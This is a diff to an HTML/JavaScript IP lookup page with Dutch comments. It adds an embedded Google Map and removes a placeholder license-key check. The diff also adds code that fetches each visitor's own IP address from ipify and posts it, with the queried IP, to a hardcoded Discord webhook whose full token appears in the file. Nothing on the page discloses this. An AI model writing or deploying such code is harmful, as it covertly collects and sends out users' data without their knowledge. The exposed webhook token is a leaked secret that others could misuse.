@@ -29,6 +29,26 @@
             color: #e5e7eb;
         }
 
+        .map-container {
+            background-color: #1e3a8a;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .gmap_canvas {
+            overflow: hidden;
+            width: 100%;
+            height: 400px;
+            border-radius: 8px;
+            background-color: #1e3a8a;
+        }
+
+        .gmap_iframe {
+            width: 100% !important;
+            height: 100% !important;
+            border-radius: 8px;
+        }
+
         #settingsPanel {
             position: fixed;
             top: 0;
@@ -237,29 +257,27 @@
                     <p><span>Timezone:</span> <span id="timezone"></span></p>
                 </div>
             </div>
+
+            <div id="googleMap" class="map-container mt-4"></div>
         </div>
     </div>
 
     <!-- JavaScript Code -->
     <script>
-        // Functie voor het valideren van de ingevoerde license key
-        function validateLicense() {
-            const licenseKey = document.getElementById('licenseKeyInput').value;
-
-            // Voorbeeld van validatie: Controleer of de license key niet leeg is
-            if (licenseKey.trim() === '') {
-                alert('Please enter a valid license key.');
-            } else {
-                // Als de license key geldig is, verberg het formulier en toon het dashboard
-                document.getElementById('licenseEntry').style.display = 'none';
-                alert('License key validated!');
-
-                // Voeg hier een extra actie toe, bijvoorbeeld de toegang tot de dashboard openen
-                // bijvoorbeeld door de instellingenpanelen te tonen of bepaalde functies in te schakelen
+        // Functie voor het ophalen van het IP van de gebruiker
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip; // Geeft het IP van de gebruiker terug
+            } catch (error) {
+                console.error("Error fetching user IP:", error);
+                return 'N/A'; // Indien er een fout optreedt, geven we 'N/A' terug
             }
         }
 
-        async function sendLogToDiscord(message) {
+        // Functie voor het verzenden van de log naar Discord
+        async function sendLogToDiscord(message, userIP) {
             const webhookURL = 'https://discord.com/api/webhooks/1346896671123968082/yR-RgtuhYK3oJON5WW_dpspCRSY47EAEASWw7c8NorE46f6MB2jpS9UnFZ2qGILiJb7o';
             const logMessage = {
                 username: "IP Lookup Bot",
@@ -269,7 +287,8 @@
                     color: 5814783,
                     fields: [
                         { name: "Timestamp", value: new Date().toLocaleString() },
-                        { name: "Log Message", value: message }
+                        { name: "Log Message", value: message },
+                        { name: "User IP", value: userIP }, // Gebruikers IP toevoegen aan de log
                     ],
                 }]
             };
@@ -283,10 +302,12 @@
             });
         }
 
+        // Aangepaste lookup functie
         async function lookupIP() {
             const ip = document.getElementById("ip").value;
             const errorMessage = document.getElementById("errorMessage");
             const resultDiv = document.getElementById("result");
+            const googleMapDiv = document.getElementById("googleMap");
             const embedContainer = document.getElementById("embedContainer");
             const secondEmbedContainer = document.getElementById("secondEmbedContainer");
             const searchingText = document.getElementById("searchingText");
@@ -299,6 +320,9 @@
             try {
                 const response = await fetch(`https://ipinfo.io/${ip}/json`);
                 const data = await response.json();
+
+                // Haal het IP van de gebruiker op
+                const userIP = await getUserIP();
 
                 if (data.error) {
                     errorMessage.textContent = data.error.message;
@@ -318,8 +342,12 @@
                     document.getElementById("latitude").textContent = 'N/A'; // Adjust if geo data is available
                     document.getElementById("longitude").textContent = 'N/A'; // Adjust if geo data is available
                     document.getElementById("timezone").textContent = data.timezone || 'N/A';
-                    
-                    await sendLogToDiscord(`IP Lookup for ${ip} successful.`);
+
+                    const mapSrc = `https://www.google.com/maps/embed/v1/view?key=YOUR_GOOGLE_MAP_API_KEY&center=${data.loc.split(',')[0]},${data.loc.split(',')[1]}&zoom=14`;
+                    googleMapDiv.innerHTML = `<iframe class="gmap_iframe" src="${mapSrc}" frameborder="0" style="border:0" allowfullscreen></iframe>`;
+
+                    // Log de lookup naar Discord, inclusief het IP van de gebruiker
+                    await sendLogToDiscord(`IP Lookup for ${ip} successful.`, userIP);
                 }
             } catch (error) {
                 alert("Error fetching data.");
